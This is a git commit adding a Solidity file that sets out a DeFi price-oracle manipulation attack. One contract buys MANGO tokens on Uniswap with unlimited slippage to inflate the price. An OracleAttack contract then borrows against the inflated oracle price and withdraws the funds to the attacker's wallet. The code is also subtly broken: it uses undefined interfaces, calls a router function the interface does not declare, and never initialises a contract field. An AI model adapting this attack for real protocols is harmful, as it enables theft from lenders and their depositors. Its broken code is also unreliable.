e2e892ad98ea293b0e91ecd0d54a36f5156f31dc
Garrett Lee <garr.c.lee@gmail.com>
2024-08-16 15:30:05 -0500

    oracle

---
+++ contracts/oracle-manipulation/MarketManipulator.sol
@@ -0,0 +1,66 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IUniswapV2Router {
+    function swapExactETHForTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+}
+
+contract MarketManipulator {
+    IUniswapV2Router public uniswapRouter;
+    address public mangoTokenAddress;
+
+    // Set the Uniswap Router address and MANGO token address upon deployment
+    constructor(address _uniswapRouter, address _mangoTokenAddress) {
+        uniswapRouter = IUniswapV2Router(_uniswapRouter);
+        mangoTokenAddress = _mangoTokenAddress;
+    }
+
+    // This function uses all the ETH sent with the transaction to buy MANGO tokens.
+    function manipulateMarket() external payable {
+        address[] memory path = new address[](2);
+        path[0] = uniswapRouter.WETH(); // Address of the wrapped ETH token on Uniswap
+        path[1] = mangoTokenAddress;
+
+        // Make the swap, sending ETH and receiving MANGO tokens
+        uniswapRouter.swapExactETHForTokens{value: msg.value}(
+            0, // Accept any amount of MANGO tokens (no minimum)
+            path,
+            msg.sender, // Tokens should be sent to the sender of this transaction
+            block.timestamp // Deadline is set to current block's timestamp
+        );
+    }
+}
+
+contract OracleAttack {
+    IDeFiTradingPlatform public tradingPlatform;
+    IOracle public priceOracle;
+    IDeFiLendingPlatform public lendingPlatform;
+    MarketManipulator public marketManipulator;
+
+    constructor(address _tradingPlatform, address _priceOracle, address _lendingPlatform) {
+        tradingPlatform = IDeFiTradingPlatform(_tradingPlatform);
+        priceOracle = IOracle(_priceOracle);
+        lendingPlatform = IDeFiLendingPlatform(_lendingPlatform);
+    }
+
+    function manipulateMarket() external {
+        // This function would use the trading platform to buy up a token and manipulate the market
+        marketManipulator.manipulateMarket();
+    }
+
+    function exploitOracle() external {
+        // This function would then use the manipulated price from the oracle to take out loans
+        uint256 manipulatedPrice = priceOracle.getPriceOfToken();
+        lendingPlatform.borrowFunds(manipulatedPrice);
+    }
+
+    function withdrawFunds() external {
+        // This function would withdraw the borrowed funds to the attacker's wallet
+        lendingPlatform.withdrawBorrowedFunds();
+    }
+}
